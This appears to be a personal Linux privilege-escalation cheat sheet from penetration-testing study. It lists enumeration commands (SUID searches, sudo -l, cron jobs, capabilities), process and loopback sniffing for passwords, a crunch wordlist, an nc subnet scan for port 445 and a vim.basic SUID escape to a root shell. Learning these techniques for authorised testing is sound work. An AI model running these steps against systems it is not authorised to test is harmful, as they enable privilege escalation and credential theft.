### Interesting locations
/etc/passwd
/etc/shadow
### Commands ###
Binaries: `find / -perm -4000 2>/dev/null` -> https://gtfobins.github.io/ 
`find / -perm -u=s -type f 2>/dev/null`` `find / -type f -perm -04000 -ls 2>/dev/null`
List local services: `ss -lnpt`
Local applications and services `ps aux | ps -ef | top | cat /etc/services`
Local applications run by root `ps aux | grep root`
List local ip adrreses `ip a`
Check environment variables `env` | `cat .bashrc`
Check known rules `cat /etc/iptables/rules.v4` 
Check known routes `routel` | `route`
Check OS version `uname -a` | `hostname` | /etc/issue /etc/os-release
Check SUDO privileges `sudo -l`
Check all cronjobs `ls -lah /etc/cron*` | `crontab -l` | `/etc/crontab`
Check installed DPKG packages `dpkg -l`
Check writeable folders `find / -writable -type d 2>/dev/null`
Check mounted filesystems  `cat /etc/fstab` | `mount`
Check available disks `lsblk`
Check loaded kernel modules `lsmod`
More information about module `/sbin/modinfo libata`
List services every second `watch -n 1 "ps -aux | grep pass"`
Capture traffic `sudo tcpdump -i lo -A | grep "pass"`
Check syslog `grep "CRON" /var/log/syslog`
Get capabilities `/usr/sbin/getcap -r / 2>/dev/null`
AppArmor `aa-status`

find . -writable -type d 2>/dev/null

### Quick worldist 
`crunch 6 6 -t Lab%%% > wordlist` 
We can do this by using the **crunch** command line tool to generate a custom wordlist. We'll set the minimum and maximum length to 6 characters, specify the pattern using the **-t** parameter, then hard-code the first three characters to **Lab** followed by three numeric digits.

### Quick Portscanner
Check all IP's if port 445 is open
`for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done`


### SUID Binaries:
vim.basic:
/usr/bin/vim.basic -c ':set shell=/bin/sh\ -p|shell'